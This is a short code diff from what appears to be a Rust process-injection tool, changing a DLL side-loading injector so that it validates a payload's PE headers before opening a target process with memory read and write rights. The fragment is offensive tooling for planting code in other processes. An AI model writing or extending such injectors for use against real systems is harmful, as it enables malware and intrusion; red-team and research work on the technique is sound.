@@ -1,4 +1,4 @@
-use crate::injection::Injector;
+use crate::injection::{payload_has_valid_pe_headers, Injector};
 /// DLL side-loading injection (S-05).
 ///
 /// Runtime approach:
@@ -36,7 +36,7 @@ impl Injector for DllSideLoadInjector {
             PROCESS_VM_READ, PROCESS_VM_WRITE,
         };
 
-        let is_pe = payload.len() >= 2 && payload[0] == b'M' && payload[1] == b'Z';
+        let is_pe = payload_has_valid_pe_headers(payload);
 
         // ── 1. Open target process ──────────────────────────────────────
         let h_proc = unsafe {
